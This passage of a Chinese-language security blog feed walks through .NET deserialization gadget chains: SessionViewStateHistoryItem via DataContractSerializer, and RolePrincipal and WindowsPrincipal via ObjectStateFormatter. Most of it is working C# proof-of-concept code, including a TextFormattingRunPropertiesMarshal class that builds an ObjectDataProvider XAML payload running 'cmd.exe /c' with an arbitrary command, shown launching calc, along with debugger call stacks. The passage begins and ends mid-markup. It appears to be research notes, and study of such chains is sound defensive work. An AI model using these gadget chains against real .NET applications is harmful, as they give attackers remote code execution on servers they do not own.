class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">[<span class="meta">Lightweight Method Call</span>]</span><br><span class="line">ClassDataContract.ReadXmlValue()</span><br><span class="line">XmlObjectSerializerReadContext.ReadDataContractValue()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">DataContractSerializer.InternalReadObject()</span><br><span class="line">XmlObjectSerializer.ReadObjectHandleExceptions()</span><br><span class="line">DataContractSerializer.ReadObject()</span><br><span class="line">Program.ReadObject()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><h2 id="SessionViewStateHistoryItem-攻击链"><a href="#SessionViewStateHistoryItem-攻击链" class="headerlink" title="SessionViewStateHistoryItem(攻击链)"></a>SessionViewStateHistoryItem(攻击链)</h2><p><strong>(这个类是SessionViewState的内部类  我们得查SessionViewStateHistoryItem才能进入到SessionViewState类中  直接查SessionViewState是进不去的  因为这个类是internal类型  还有就是原生的dll也是没这个类的  我们得重新下载这个dll 然后再导入进去)</strong></p><p>这就是我踩的坑  所以记录一下这个过程</p><p>这个新链子  我们直接去yso看起构造方法</p><p><img src="../images/image-20240312111654111.png" alt="image-20240312111654111"></p><p>直接去看SetType函数获取的是哪个类</p><p><img src="../images/image-20240312111857605.png" alt="image-20240312111857605"></p><p>获取的刚好是我们这个需要构造的攻击链   如何接着往下看  看看其为什么要给这个类里的s参数赋值</p><p><img src="../images/image-20240312143439867.png" alt="image-20240312143439867"></p><p>在<code>SessionViewStateHistoryItem</code>这个类进行反序列化的时候  会调用这个s参数  然后进行LosFormatter的反序列化操作  这就是为什么要传s参数的原因</p><p>完整Poc</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"><span class="keyword">using</span> System.Xml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DataContractDeserialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// [Serializable]</span></span><br><span class="line">    <span class="comment">// public class SessionViewStateHistoryItemMarshal : ISerializable</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     public SessionViewStateHistoryItemMarshal(string strB64LosFormatterPayload)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         B64LosFormatterPayload = strB64LosFormatterPayload;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//     private string B64LosFormatterPayload &#123; get; &#125;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//     public void GetObjectData(SerializationInfo info, StreamingContext context)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         Type myType_SessionViewState = Type.GetType(&quot;System.Web.UI.MobileControls.SessionViewState, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;);</span></span><br><span class="line">    <span class="comment">//         Type[] nestedTypes = myType_SessionViewState.GetNestedTypes(BindingFlags.NonPublic | BindingFlags.Instance);</span></span><br><span class="line">    <span class="comment">//         info.SetType(nestedTypes[0]); // to reach the SessionViewStateHistoryItem class (private)</span></span><br><span class="line">    <span class="comment">//         info.AddValue(&quot;s&quot;, B64LosFormatterPayload);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// [Serializable]</span></span><br><span class="line">    <span class="comment">// public class TextFormattingRunPropertiesMarshal : ISerializable</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     protected TextFormattingRunPropertiesMarshal(SerializationInfo info, StreamingContext context)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     string _xaml;</span></span><br><span class="line">    <span class="comment">//     public void GetObjectData(SerializationInfo info, StreamingContext context)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         Type typeTFRP = typeof(TextFormattingRunProperties);</span></span><br><span class="line">    <span class="comment">//         info.SetType(typeTFRP);</span></span><br><span class="line">    <span class="comment">//         info.AddValue(&quot;ForegroundBrush&quot;, _xaml);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">//     public TextFormattingRunPropertiesMarshal(string cmd)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         // ObjectDataProvider</span></span><br><span class="line">    <span class="comment">//         ProcessStartInfo psi = new ProcessStartInfo();</span></span><br><span class="line">    <span class="comment">//         psi.FileName = &quot;cmd.exe&quot;;</span></span><br><span class="line">    <span class="comment">//         psi.Arguments = $&quot;/c &#123;cmd&#125;&quot;;</span></span><br><span class="line">    <span class="comment">//         StringDictionary dict = new StringDictionary();</span></span><br><span class="line">    <span class="comment">//         psi.GetType().GetField(&quot;environmentVariables&quot;, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span></span><br><span class="line">    <span class="comment">//         Process p = new Process();</span></span><br><span class="line">    <span class="comment">//         p.StartInfo = psi;</span></span><br><span class="line">    <span class="comment">//         ObjectDataProvider odp = new ObjectDataProvider();</span></span><br><span class="line">    <span class="comment">//         odp.MethodName = &quot;Start&quot;;</span></span><br><span class="line">    <span class="comment">//         odp.IsInitialLoadEnabled = false;</span></span><br><span class="line">    <span class="comment">//         odp.ObjectInstance = p;</span></span><br><span class="line">    <span class="comment">//         _xaml = XamlWriter.Save(odp);   </span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//WriteObject(&quot;a.xml&quot;);</span></span><br><span class="line">            ReadObject(<span class="string">&quot;D:\\Rider\\Project\\ConsoleApplication2\\ConsoleApplication2\\DataContractSerializerExample.xml&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//         public static void WriteObject(string fileName)</span></span><br><span class="line"><span class="comment">//         &#123;</span></span><br><span class="line"><span class="comment">//             string losFormatterPayload;</span></span><br><span class="line"><span class="comment">//             using (MemoryStream memory = new MemoryStream())</span></span><br><span class="line"><span class="comment">//             &#123;</span></span><br><span class="line"><span class="comment">//                 LosFormatter losFormatter = new LosFormatter();</span></span><br><span class="line"><span class="comment">//                 //losFormatter.Serialize(memory, new TextFormattingRunPropertiesMarshal(&quot;calc&quot;));</span></span><br><span class="line"><span class="comment">//                 losFormatterPayload = Encoding.UTF8.GetString(memory.ToArray());</span></span><br><span class="line"><span class="comment">//             &#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// //             string payload = $@&quot;&lt;root type=&quot;&quot;System.Web.UI.MobileControls.SessionViewState+SessionViewStateHistoryItem, System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;&quot;&gt;&lt;SessionViewState.SessionViewStateHistoryItem xmlns:i=&quot;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&quot; xmlns:x=&quot;&quot;http://www.w3.org/2001/XMLSchema&quot;&quot; xmlns:z=&quot;&quot;http://schemas.microsoft.com/2003/10/Serialization/&quot;&quot; xmlns=&quot;&quot;http://schemas.datacontract.org/2004/07/System.Web.UI.MobileControls&quot;&quot;&gt;</span></span><br><span class="line"><span class="comment">// //   &lt;s i:type=&quot;&quot;x:string&quot;&quot; xmlns=&quot;&quot;&quot;&quot;&gt;&#123;losFormatterPayload&#125;&lt;/s&gt;</span></span><br><span class="line"><span class="comment">// // &lt;/SessionViewState.SessionViewStateHistoryItem&gt;&lt;/root&gt;&quot;;</span></span><br><span class="line"><span class="comment">//             // SessionViewStateHistoryItemMarshal textFormattingRunPropertiesMarshal =</span></span><br><span class="line"><span class="comment">//             //     new SessionViewStateHistoryItemMarshal(payload);</span></span><br><span class="line"><span class="comment">//             // File.WriteAllText(fileName, payload);</span></span><br><span class="line"><span class="comment">//             // Console.WriteLine(payload);</span></span><br><span class="line"><span class="comment">//         &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ReadObject</span>(<span class="params"><span class="built_in">string</span> fileName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> xml = File.ReadAllText(fileName);</span><br><span class="line">            XmlDocument xmlDocument = <span class="keyword">new</span> XmlDocument();</span><br><span class="line">            xmlDocument.LoadXml(xml);</span><br><span class="line">            XmlNode rootNode = xmlDocument.SelectSingleNode(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">            XmlNode typeNode = rootNode.Attributes.GetNamedItem(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">            DataContractSerializer dataContractSerializer = <span class="keyword">new</span> DataContractSerializer(Type.GetType(typeNode.InnerText));</span><br><span class="line">            Console.WriteLine(Type.GetType(typeNode.InnerText));</span><br><span class="line">            dataContractSerializer.ReadObject(<span class="keyword">new</span> XmlTextReader(<span class="keyword">new</span> StringReader(rootNode.InnerXml)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用栈</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">XamlReader.Parse()at </span><br><span class="line">TextFormattingRunProperties.GetObjectFromSerializationInfo()</span><br><span class="line"><span class="keyword">new</span> TextFormattingRunProperties()</span><br><span class="line">[<span class="meta">Native to Managed Transition</span>]</span><br><span class="line">ObjectManager.CompleteISerializableObject()</span><br><span class="line">ObjectManager.FixupSpecialObject()</span><br><span class="line">ObjectManager.DoFixups()</span><br><span class="line">ObjectReader.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">BinaryFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.DeserializeValue()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">ObjectStateFormatter.Deserialize()</span><br><span class="line">LosFormatter.Deserialize()</span><br><span class="line"><span class="keyword">new</span> SessionViewState.SessionViewStateHistoryItem()</span><br><span class="line">[<span class="meta">Lightweight Method Call</span>]</span><br><span class="line">ClassDataContract.ReadXmlValue()</span><br><span class="line">XmlObjectSerializerReadContext.ReadDataContractValue()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">XmlObjectSerializerReadContext.InternalDeserialize()</span><br><span class="line">DataContractSerializer.InternalReadObject()</span><br><span class="line">XmlObjectSerializer.ReadObjectHandleExceptions()</span><br><span class="line">DataContractSerializer.ReadObject()</span><br><span class="line">Program.ReadObject()</span><br><span class="line">Program.Main()</span><br></pre></td></tr></table></figure><p>就是控制type和xml值就行了</p><p>NetDataContractSerializer和DataContractSerializer同样用于序列化和反序列化 Windows Communication Foundation (WCF) 消息中发送的数据。</p><p>两者有一个重要的区别在于：<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8">NetDataContractSerializer</a> 在序列化的 XML 中包含 CLR 类型信息；而 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.datacontractserializer?view=netframework-4.8">DataContractSerializer</a> 不包含。 因此，只有在序列化和反序列化端使用相同的 CLR 类型时，才能使用 <a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.netdatacontractserializer?view=netframework-4.8">NetDataContractSerializer</a>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/Y4er/dotnet-deserialization/blob/main/DataContractSerializer.md&quot;&gt;https://github.com/Y4er/dotnet-deserializati</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-07</title>
    <link href="https://ke1nys.github.io/posts/4d98bf02.html"/>
    <id>https://ke1nys.github.io/posts/4d98bf02.html</id>
    <published>2024-03-06T07:00:40.000Z</published>
    <updated>2024-03-12T14:41:01.019Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/ObjectStateFormatter.md">https://github.com/Y4er/dotnet-deserialization/blob/main/ObjectStateFormatter.md</a></p><h2 id="ObjectStateFormatter"><a href="#ObjectStateFormatter" class="headerlink" title="ObjectStateFormatter"></a>ObjectStateFormatter</h2><p>在06中就讲到的LosFormatter反序列化的时候  就会将字节流转到这个反序列化类来进行</p><p>ObjectStateFormatter和没有设置mac/keys的LosFormatter是一样的。所以在遇到ObjectStateFormatter反序列化时直接用ysoserial.net的LosFormatter生成payload即可，除非需要mac/key</p><p><strong>(06中没有用到mac/key)</strong></p><p>和LosFormatter一样  也是能接受stream和string类型的序列化</p><h2 id="RolePrincipal"><a href="#RolePrincipal" class="headerlink" title="RolePrincipal"></a>RolePrincipal</h2><p>demo</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Specialized;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Security.Claims;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Web.UI;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Data;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Markup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">ObjectStateFormatterSerialize</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            TextFormattingRunPropertiesMarshal calc = <span class="keyword">new</span> TextFormattingRunPropertiesMarshal(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            <span class="built_in">string</span> b64payload;</span><br><span class="line">            <span class="keyword">using</span> (MemoryStream m = <span class="keyword">new</span> MemoryStream())</span><br><span class="line">            &#123;</span><br><span class="line">                BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">                binaryFormatter.Serialize(m, calc);</span><br><span class="line">                b64payload = Convert.ToBase64String(m.ToArray());</span><br><span class="line">            &#125;</span><br><span class="line">            RolePrincipalMarshal rolePrincipalMarshal = <span class="keyword">new</span> RolePrincipalMarshal(b64payload);</span><br><span class="line">            ObjectStateFormatter objectStateFormatter = <span class="keyword">new</span> ObjectStateFormatter();</span><br><span class="line">            <span class="built_in">string</span> p = objectStateFormatter.Serialize(rolePrincipalMarshal);</span><br><span class="line">            objectStateFormatter.Deserialize(p);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">RolePrincipalMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">RolePrincipalMarshal</span>(<span class="params"><span class="built_in">string</span> b64payload</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            B64Payload = b64payload;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> B64Payload &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            info.SetType(<span class="keyword">typeof</span>(System.Web.Security.RolePrincipal));</span><br><span class="line">            info.AddValue(<span class="string">&quot;System.Security.ClaimsPrincipal.Identities&quot;</span>, B64Payload);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">Serializable</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TextFormattingRunPropertiesMarshal</span> : <span class="title">ISerializable</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">string</span> _xaml;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Type typeTFRP = <span class="keyword">typeof</span>(TextFormattingRunProperties);</span><br><span class="line">            info.SetType(typeTFRP);</span><br><span class="line">            info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, _xaml);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">TextFormattingRunPropertiesMarshal</span>(<span class="params"><span class="built_in">string</span> cmd</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// ObjectDataProvider</span></span><br><span class="line">            ProcessStartInfo psi = <span class="keyword">new</span> ProcessStartInfo();</span><br><span class="line">            psi.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">            psi.Arguments = <span class="string">$&quot;/c <span class="subst">&#123;cmd&#125;</span>&quot;</span>;</span><br><span class="line">            StringDictionary dict = <span class="keyword">new</span> StringDictionary();</span><br><span class="line">            psi.GetType().GetField(<span class="string">&quot;environmentVariables&quot;</span>, BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);</span><br><span class="line">            Process p = <span class="keyword">new</span> Process();</span><br><span class="line">            p.StartInfo = psi;</span><br><span class="line">            ObjectDataProvider odp = <span class="keyword">new</span> ObjectDataProvider();</span><br><span class="line">            odp.MethodName = <span class="string">&quot;Start&quot;</span>;</span><br><span class="line">            odp.IsInitialLoadEnabled = <span class="literal">false</span>;</span><br><span class="line">            odp.ObjectInstance = p;</span><br><span class="line">            _xaml = XamlWriter.Save(odp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h3><p>先去看这个RolePrincipal的反序列化构造函数</p><p><img src="../images/image-20240306152938875.png" alt="image-20240306152938875"></p><p>其用的是其父类ClaimsPrincipal的反序列化构造函数  我们跟进</p><p><img src="../images/image-20240306153053874.png" alt="image-20240306153053874"></p><p>接着跟进这个Deserialize函数中</p><p><img src="../images/image-20240306153126203.png" alt="image-20240306153126203"></p><p>发现其需要的是ClaimsPrincipal类中的Identities参数   先不知道这个参数是干啥的  我们接着跟进这个DeserializeIdentities函数中去</p><p><img src="../images/image-20240306153248282.png" alt="image-20240306153248282"></p><p>发现其会先base64解码我们传入的值  然后进行反序列化操作  </p><p>那么我们的目标就清晰了  只需将payload的base64编码在序列化的时候传入到System.Security.ClaimsPrincipal.Identities中就行了</p><h2 id="WindowsPrincipal"><a href="#WindowsPrincipal" class="headerlink" title="WindowsPrincipal"></a>WindowsPrincipal</h2><p>demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">using Microsoft.VisualStudio.Text.Formatting;</span><br><span class="line">using System;</span><br><span class="line">using System.Collections.Specialized;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Reflection;</span><br><span class="line">using System.Runtime.Serialization;</span><br><span class="line">using System.Security.Claims;</span><br><span class="line">using System.Security.Principal;    </span><br><span class="line">using System.Web.UI;</span><br><span class="line">using System.Windows.Data;</span><br><span class="line">using System.Windows.Markup;</span><br><span class="line"></span><br><span class="line">namespace ObjectStateFormatterSerialize</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            // WindowsIdentity currentWI = WindowsIdentity.GetCurrent();</span><br><span class="line">            // currentWI.Actor = new ClaimsIdentity();</span><br><span class="line">            // currentWI.Actor.BootstrapContext = new TextFormattingRunPropertiesMarshal(&quot;calc&quot;);</span><br><span class="line">            // WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();</span><br><span class="line">            // obj.wi = currentWI;</span><br><span class="line">            // string v = new ObjectStateFormatter().Serialize(obj);</span><br><span class="line">            // new ObjectStateFormatter().Deserialize(v);</span><br><span class="line">            WindowsIdentity currentWI = WindowsIdentity.GetCurrent();</span><br><span class="line">            currentWI.BootstrapContext= new TextFormattingRunPropertiesMarshal(&quot;calc&quot;);</span><br><span class="line">            WindowsPrincipalMarshal obj = new WindowsPrincipalMarshal();</span><br><span class="line">            obj.wi = currentWI;</span><br><span class="line">            string v = new ObjectStateFormatter().Serialize(obj);</span><br><span class="line">            new ObjectStateFormatter().Deserialize(v);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    [Serializable]</span><br><span class="line">    public class WindowsPrincipalMarshal : ISerializable</span><br><span class="line">    &#123;</span><br><span class="line">        public WindowsPrincipalMarshal() &#123; &#125;</span><br><span class="line">        public WindowsIdentity wi &#123; get; set; &#125;</span><br><span class="line">        public void 